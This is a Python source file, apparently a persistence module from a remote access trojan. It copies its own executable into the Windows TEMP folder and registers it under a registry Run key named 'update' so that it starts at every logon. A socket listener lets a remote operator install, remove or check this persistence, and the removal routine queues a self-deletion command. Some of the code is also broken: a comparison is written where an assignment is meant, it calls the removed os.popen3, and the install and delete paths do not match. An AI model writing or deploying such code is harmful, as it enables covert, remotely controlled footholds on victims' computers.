import os
import sys
import subprocess
import shutil
import requests
import os


SERVICE_NAME= "update"

if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''
EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)


def install():
    if not is_installed():
        stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
        shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)


def clean():
    subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME,
                         shell=True)
    subprocess.Popen(
        "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""),
                          shell=True)


def is_installed():
    output = os.popen(
        "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
    if SERVICE_NAME in output.read():
        return True
    else:
        return False


def main(host,s,port):
	response == s.recv(1024)
	if response.decode("utf-8") == 'install':
		install()
		s.send(str.encode("Persistence installed!"))
	if response.decode("utf-8") == 'remove':
		clean()
	if response.decode("utf-8") == 'status':
		if is_installed():
			s.send(str.encode("Persistence [ON]!"))
		else:
			s.send(str.encode("Persistence [OFF]!"))
	

